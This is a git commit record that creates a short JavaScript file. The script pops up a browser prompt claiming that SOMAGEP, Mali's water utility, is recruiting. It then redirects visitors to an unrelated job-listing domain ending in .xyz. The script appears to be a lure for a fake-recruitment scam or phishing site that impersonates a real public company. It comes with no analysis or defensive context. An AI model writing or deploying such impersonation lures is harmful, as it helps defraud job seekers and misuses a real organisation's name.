a68c024272d8791114e82d17bdfa109c26f0fc2a
newetijazz2 <newetijazz2@gmail.com>
2025-09-06 12:34:57 +0100

    Create maliwater.js

---
+++ maliwater.js
@@ -0,0 +1,6 @@
+
+var password = 'SOMAGEP Recruitment'
+password=prompt('NOTICE: Société Malienne de Gestion de l Eau Potable (SOMAGEP) recrute actuellement, appuyez sur OK pour postuler','SOMAGEP Recruitment');
+if (password != 'SOMAGEP Recruitment') {
+location.href='https://www.botswajobs.xyz/SOMAGEP-SA-Recruitment';
+}
